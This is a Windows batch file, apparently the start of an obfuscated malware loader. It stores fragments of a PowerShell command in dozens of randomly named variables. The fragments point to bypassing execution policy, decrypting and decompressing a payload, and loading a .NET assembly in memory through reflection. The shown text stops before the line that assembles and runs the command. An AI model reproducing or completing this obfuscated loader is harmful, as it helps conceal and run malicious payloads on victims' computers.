@echo off
set "yMPCBMKwOZ=-nop"
set "ysVYJCqOrx=  $O"
set "cHlxOdxbDc=Disp"
set "PUIkbHwgGx=ay()"
set "lzxEfvXmJQ=)) {"
set "RXSdGcRaly=daeR"
set "FwxoGZXVZC=n ''"
set "dbITJUnDKa=pStr"
set "USpmchaAMR=vsks"
set "pTGsShGxzp=:: '"
set "pgucSeBboW=('%*'"
set "MCcdKHRvPl=y.Ci"
set "RxqHMLPufa=stem"
set "OByzrTgncZ= '')"
set "YnWktmEFio=();$"
set "LHZCMgCqZD=stem"
set "YGsXluDGNq=.Com"
set "fjbjwHbPtO=onve"
set "HvOYSoECUR=);$O"
set "NPfeRhkFoW=IgtB"
set "aSSDwfcdco=grap"
set "GWJBgOTqQj='txe"
set "DOZYhftnod=dj0C"
set "eeugMndWPY=Invo"
set "tEuNQsbbMQ=bjec"
set "IYzqTnwTzY=-Obj"
set "gEZFgjAHKu=oryS"
set "zrktAUvGRC=ss -"
set "YWRoigXofQ=m.IO"
set "MHYmrJXVix=();$"
set "uybQRCmVqs= = $"
set "gaSQwiiVCO=EAuv"
set "OxAyTrZMQS=);$O"
set "QdMgbzAYtb=rofi"
set "fOuJYhaKLp=ecry"
set "bCWZbNpDUd=.GZi"
set "pDBFYFwjTM=$TeL"
set "BFfwkxMVQq=.Mod"
set "ODlHeRSvVQ=[Env"
set "QlssdfKkDx=Obje"
set "eIiYBfivem=ptog"
set "ssstAUznnF=fore"
set "ALfZUfdUTZ=ENd."
set "xviWQErRoA=$joa"
set "wmEzPCxiVK=tB ="
set "uxzSyUtRnh=bstr"
set "yZVCmkyPJQ=rity"
set "FtbNepgDso=;$jO"
set "dRacvCqPSu=-joi"
set "pelLGqFmfk=[-1."
set "LggEHaksSN=ke($"
set "PXVfuRJmVg=($JZ"
set "bSfwLCBafE=ct S"
set "wEevtyMnFC=em.I"
set "opqdtmwNOM=jA);"
set "LDXZoCQmoW=ne);"
set "ObczmTjpsQ=:('g"
set "gJsbOQSNWB=ew-O"
set "RBdsojLuvL=Ypp "
set "CbbZCVLdYP=, (,"
set "ETbVIraUBZ=Comp"
set "CbBYmdNluc=joaj"
set "zKIojVQJHF=7;$O"
set "ErsowKegcM=[]] "
set "uIBgxHHvka=yste"
set "QidhuKyovV=RmAx"
set "DgtBRnAAOx=k; }"
set "oslPTtrlGG=)($O"
set "HToSAqBLlp=('da"
set "vSSkwjtDDq=zHhH"
set "fDriKZyJjd=le  "
set "vMdUkIwPXs=tem."
set "bQSHPzQoVK=Ypp."
set "FrkXjugvHw=mory"
set "OHzXvVdmev='[-1"
set "EeFpApETxu='[-1"
set "ZWUnDBdXpk=and "
set "HsgcctzOaw=y]::"
set "GxMMCeDtlV=Stre"
set "kfCnNwMJGf=xE.T"
set "ZutJCbNNeF=ck($"
set "bIHtqCwWPY= [Sy"
set "yUwLyeVszR='')("
set "yUhLDxzAIT=();$"
set "OxjBqisaEc=.Ass"
set "PjBzztCvzN=rt]:"
set "yItoMwjQsk=106u"
set "JZwCCxWLnd=.Cry"
set "bAUTXNBxnZ=ion."
set "RynoMgpUvy=ddin"
set "iKEmRXzEdf=-ep "
set "HJlzzFADBr=eLIp"
set "WWDNNKOnIi=D) {"
